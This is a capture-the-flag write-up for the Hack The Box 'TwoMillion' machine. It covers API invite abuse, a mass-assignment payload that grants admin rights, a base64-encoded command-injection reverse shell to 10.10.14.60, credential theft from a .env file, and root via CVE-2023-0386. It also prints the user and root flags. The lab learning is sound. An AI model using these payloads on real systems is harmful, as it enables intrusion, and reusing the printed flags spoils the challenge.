# Hack The Box: TwoMillion

### Challenge Name: TwoMillion
**Difficulty:** Easy

![image](https://github.com/user-attachments/assets/b56b182a-6a29-448d-adab-c9879eeffb2a)



## Writeup:

To start, I ran nmap on the ip address to see what ports were exposed:

`nmap 10.10.11.221`

I saw that 2 ports were opened `80 and 22`

![image](https://github.com/user-attachments/assets/83ba8af9-237d-4148-a9d9-4685d5453e97)

After going to the website, I found a hint that the developers gave away (<b> exploit the invite proccess</b>)

![image](https://github.com/user-attachments/assets/ca60947b-a7f8-4c6d-b36e-b3c380b70de6)

After looking at the resources loaded for the /invite talk, I saw an interesting file called `inviteapi.min.js`

![image](https://github.com/user-attachments/assets/6a8230e3-f3cc-4ed9-84bc-1d84fbc8d4aa)

The .js file seemed to be obfuscated, so I used `https://de4js.kshift.me/` to decode the actual code.
The decoded result is:

```
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function(response) {
            console.log(response)
        },
        error: function(response) {
            console.log(response)
        }
    })
}
```
The important part is that the `makeInviteCode()` api has been leaked!! We can use this endpoint to create an invite code for ourselves. 

After running the function, I got a ROT13 encrypted string:

`Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr` 

which decodes to 

`In order to generate the invite code, make a POST request to /api/v1/invite/generate`

![image](https://github.com/user-attachments/assets/4c3976bf-d5af-41d5-b118-6e9a1ec98780)


So I followed the instructions and made a `POST` request to `/api/v1/invite/generate`.

Great!! I was able to get the code `T1dKNVUtOTlUTkotSUJLMFEtVTM1REk=` 

which is Base64 Encoded for 

`OWJ5U-99TNJ-IBK0Q-U35DI`

With this code, I was able to complete the signup process.

Now that I logged in, I played around more with the APIs, and I found out `http://2million.htb/api/v1` gave me a map of all the V1 API call.

![image](https://github.com/user-attachments/assets/194727d1-4964-430b-9a34-086c8b20ba65)

From the APIs, I was interested in the `/api/v1/admin/settings/update` enpoint as this allows us to update the user settings.

After resending it, I saw that message what warned me of `invalid content type`.

![image](https://github.com/user-attachments/assets/d5d80e7a-60cb-4238-8f92-ef7051b56613)

To fix this, I added `Content-Type: application/json` in my HTTP header.

![image](https://github.com/user-attachments/assets/851d4f2e-b254-411d-9b7f-16f0b360a3ac)

Now, I get an error saying there is no email parameter, so I added `{'email': 'temp@gmail.com'}` into my payload.

![image](https://github.com/user-attachments/assets/25fbd10c-d5bd-4d84-b204-7b16a4e29eb0)


Seems like I have to change my payload again to: `{
"email": "temp@gmail.com", "is_admin" : 1
}`

GREAT! This time it worked at it seemed to have changed my account to an admin account.

![image](https://github.com/user-attachments/assets/04e4ce53-bbd7-4b78-819a-d489537c2f73)


With this, I now decide to test the `/api/v1/admin/vpn/generate` enpoint. I fill out all of the requirements and I was able to generate the VPN.

![image](https://github.com/user-attachments/assets/368bbf35-79ae-4f88-9cb7-cb02d2ff03cc)

After some playing around, I found out that it was vulnerable to command injection. I used this to create a reverse shell.


```
{
"username": "hackerman;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42MC85OTk5IDA+JjE= | base64 -d | bash;"
}
```

![image](https://github.com/user-attachments/assets/103888ad-43b1-41aa-a677-ef78792f3d91)

After some digging, I found a .env file which had the DB username and password

![image](https://github.com/user-attachments/assets/bd3b6ac7-2ef9-46f1-b984-5d31ce86230a)


With these credentials I was able to SSH into the machine. I was able to get the user flag (`ba25a30c7e0bcd542c1274e03985dc6a`)...
But this is not a root account unfortunately :(

![image](https://github.com/user-attachments/assets/c940497c-a205-48ce-a35e-291c81fd0113)


From looking at the OS, it is running `22.04.2 LTS (Jammy Jellyfish)`. I looked up Privilege Escalation scripts for this version and found `CVE-2023-0386`

`https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/`

After Executing the exploit I was able to get Root and the flag was `25b40afff5c53db702668299add6f306`

![image](https://github.com/user-attachments/assets/23bc035c-4afd-4664-8b4e-0f3f56507399)
